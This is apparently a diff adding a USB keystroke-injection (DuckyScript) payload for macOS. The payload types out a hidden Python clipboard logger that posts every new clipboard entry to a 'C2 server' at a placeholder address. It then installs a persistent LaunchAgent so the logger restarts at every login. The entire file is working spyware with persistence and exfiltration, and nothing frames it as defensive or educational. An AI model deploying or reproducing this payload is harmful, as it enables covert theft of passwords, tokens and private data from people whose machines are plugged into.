@@ -1,0 +1,290 @@
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING mkdir -p ~/.local/share
+ENTER
+DELAY 500
+STRING cat << 'EOF' > ~/.local/share/.clipboard_history.py
+ENTER
+DELAY 500
+STRING import pyperclip
+ENTER
+DELAY 500
+STRING import time
+ENTER
+DELAY 500
+STRING import os
+ENTER
+DELAY 500
+STRING import requests
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING # Path to the clipboard history file
+ENTER
+DELAY 500
+STRING history_file = os.path.expanduser("~/.local/share/.clipboard_history.txt")
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING # URL of the C2 server
+ENTER
+DELAY 500
+STRING C2_URL = "http://x.x.x.x:port/clipboard"
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING def read_clipboard():
+ENTER
+DELAY 500
+STRING     try:
+ENTER
+DELAY 500
+STRING         return pyperclip.paste()
+ENTER
+DELAY 500
+STRING     except Exception as e:
+ENTER
+DELAY 500
+STRING         print(f"Error reading clipboard: {e}")
+ENTER
+DELAY 500
+STRING         return None
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING def write_history(content):
+ENTER
+DELAY 500
+STRING     with open(history_file, 'a') as file:
+ENTER
+DELAY 500
+STRING         file.write(content + "\n")
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING def send_to_c2(content):
+ENTER
+DELAY 500
+STRING     try:
+ENTER
+DELAY 500
+STRING         response = requests.post(C2_URL, json={"clipboard": content})
+ENTER
+DELAY 500
+STRING         if response.status_code == 200:
+ENTER
+DELAY 500
+STRING             print("Clipboard data sent to C2 server.")
+ENTER
+DELAY 500
+STRING         else:
+ENTER
+DELAY 500
+STRING             print(f"Failed to send data to C2 server: {response.status_code}")
+ENTER
+DELAY 500
+STRING     except Exception as e:
+ENTER
+DELAY 500
+STRING         print(f"Error sending data to C2 server: {e}")
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING def track_clipboard():
+ENTER
+DELAY 500
+STRING     last_content = ""
+ENTER
+DELAY 500
+STRING     while True:
+ENTER
+DELAY 500
+STRING         current_content = read_clipboard()
+ENTER
+DELAY 500
+STRING         if current_content and current_content != last_content:
+ENTER
+DELAY 500
+STRING             print(f"New clipboard content detected: {current_content}")
+ENTER
+DELAY 500
+STRING             write_history(current_content)
+ENTER
+DELAY 500
+STRING             send_to_c2(current_content)
+ENTER
+DELAY 500
+STRING             last_content = current_content
+ENTER
+DELAY 500
+STRING         time.sleep(1)
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING def show_history():
+ENTER
+DELAY 500
+STRING     if os.path.exists(history_file):
+ENTER
+DELAY 500
+STRING         with open(history_file, 'r') as file:
+ENTER
+DELAY 500
+STRING             history = file.readlines()
+ENTER
+DELAY 500
+STRING             print("Clipboard History:")
+ENTER
+DELAY 500
+STRING             for idx, item in enumerate(history, 1):
+ENTER
+DELAY 500
+STRING                 print(f"{idx}: {item.strip()}")
+ENTER
+DELAY 500
+STRING     else:
+ENTER
+DELAY 500
+STRING         print("No clipboard history found.")
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING if __name__ == "__main__":
+ENTER
+DELAY 500
+STRING     import argparse
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING     parser = argparse.ArgumentParser(description="Clipboard history manager for macOS.")
+ENTER
+DELAY 500
+STRING     parser.add_argument("-t", "--track", action="store_true", help="Track clipboard changes and save to history.")
+ENTER
+DELAY 500
+STRING     parser.add_argument("-s", "--show", action="store_true", help="Show clipboard history.")
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING     args = parser.parse_args()
+ENTER
+DELAY 500
+STRING 
+ENTER
+DELAY 500
+STRING     if args.track:
+ENTER
+DELAY 500
+STRING         track_clipboard()
+ENTER
+DELAY 500
+STRING     elif args.show:
+ENTER
+DELAY 500
+STRING         show_history()
+ENTER
+DELAY 500
+STRING     else:
+ENTER
+DELAY 500
+STRING         parser.print_help()
+ENTER
+DELAY 500
+STRING EOF
+ENTER
+DELAY 500
+STRING chmod +x ~/.local/share/.clipboard_history.py
+ENTER
+DELAY 500
+STRING mkdir -p ~/Library/LaunchAgents
+ENTER
+DELAY 500
+STRING cat << 'EOF' > ~/Library/LaunchAgents/com.example.clipboard.plist
+ENTER
+DELAY 500
+STRING <?xml version="1.0" encoding="UTF-8"?>
+ENTER
+DELAY 500
+STRING <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+ENTER
+DELAY 500
+STRING <plist version="1.0">
+ENTER
+DELAY 500
+STRING <dict>
+ENTER
+DELAY 500
+STRING     <key>Label</key>
+ENTER
+DELAY 500
+STRING     <string>com.example.clipboard</string>
+ENTER
+DELAY 500
+STRING     <key>ProgramArguments</key>
+ENTER
+DELAY 500
+STRING     <array>
+ENTER
+DELAY 500
+STRING         <string>/usr/bin/python3</string>
+ENTER
+DELAY 500
+STRING         <string>/Users/$USER/.local/share/.clipboard_history.py</string>
+ENTER
+DELAY 500
+STRING         <string>-t</string>
+ENTER
+DELAY 500
+STRING     </array>
+ENTER
+DELAY 500
+STRING     <key>RunAtLoad</key>
+ENTER
+DELAY 500
+STRING     <true/>
+ENTER
+DELAY 500
+STRING     <key>KeepAlive</key>
+ENTER
+DELAY 500
+STRING     <true/>
+ENTER
+DELAY 500
+STRING </dict>
+ENTER
+DELAY 500
+STRING </plist>
+ENTER
+DELAY 500
+STRING EOF
+ENTER
+DELAY 500
+STRING launchctl load ~/Library/LaunchAgents/com.example.clipboard.plist
+ENTER
+DELAY 500
+STRING exit
+ENTER
